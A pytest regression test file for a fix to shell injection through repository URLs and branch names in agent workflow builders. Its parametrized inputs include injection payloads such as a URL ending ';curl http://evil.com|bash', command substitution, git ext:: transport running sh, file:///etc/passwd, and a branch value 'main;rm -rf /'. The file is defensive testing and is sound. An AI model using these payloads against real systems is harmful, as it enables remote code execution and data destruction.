"""Regression test for GAP-0079 / SEC-021 — repo_url shell injection.

Offline / no AWS: exercises the pure ``validate_repo_url`` helper and the pure
``build_coder_workflow`` / ``build_architect_workflow`` functions directly.

Fails-before / passes-after: before the fix a repo_url containing ``;``,
``$()`` or the ``ext::`` git transport was f-stringed verbatim into the
clone_repo shell command; after the fix it is rejected by ``validate_repo_url``.
"""

import pytest

from app.core.validate_url import validate_repo_url
from app.services.agent_coder import build_coder_workflow
from app.services.agent_architect import build_architect_workflow

TICKET = {"ticket_id": "T-1", "subject": "Fix bug"}


# --- validate_repo_url unit checks -----------------------------------------

@pytest.mark.parametrize(
    "bad",
    [
        "https://github.com/user/repo;curl http://evil.com|bash",  # semicolon
        "https://github.com/repo$(whoami)",                        # $() subst
        "https://github.com/repo`id`",                             # backtick
        "ext::sh -c 'id>/tmp/p'",                                  # ext transport
        "file:///etc/passwd",                                      # file transport
        "https://github.com/repo%0acurl evil",                    # pct-encoded LF
    ],
)
def test_validate_repo_url_rejects_injection(bad):
    with pytest.raises(ValueError):
        validate_repo_url(bad)


@pytest.mark.parametrize(
    "good",
    [
        "https://github.com/org/repo.git",
        "git@github.com:org/repo.git",
    ],
)
def test_validate_repo_url_accepts_clean(good):
    assert validate_repo_url(good) == good


# --- coder workflow ---------------------------------------------------------

def test_coder_workflow_rejects_injection():
    cfg = {"repo_url": "https://github.com/repo;curl http://evil.com|bash",
           "test_commands": ["pytest"]}
    with pytest.raises(ValueError):
        build_coder_workflow(agent_run_id="r1", config=cfg, ticket=TICKET)


def test_coder_workflow_accepts_clean_https():
    cfg = {"repo_url": "https://github.com/org/repo", "test_commands": ["pytest"]}
    wf = build_coder_workflow(agent_run_id="r1", config=cfg, ticket=TICKET)
    clone = next(s for s in wf["steps"] if s["type"] == "clone_repo")
    assert "https://github.com/org/repo" in clone["command"]
    # No injection metacharacters leaked into the command around the URL.
    assert ";curl" not in clone["command"]


# --- architect workflow -----------------------------------------------------

def test_architect_workflow_rejects_injection():
    cfg = {"repo_url": "ext::sh -c 'id'", "repo_branch": "main"}
    with pytest.raises(ValueError):
        build_architect_workflow(agent_run_id="r1", config=cfg, ticket=TICKET)


def test_architect_workflow_sanitizes_branch():
    cfg = {"repo_url": "https://github.com/org/repo",
           "repo_branch": "main;rm -rf /"}
    wf = build_architect_workflow(agent_run_id="r1", config=cfg, ticket=TICKET)
    clone = next(s for s in wf["steps"] if s["type"] == "clone_repo")
    assert "rm -rf" not in clone["command"]
    assert ";" not in clone["command"]
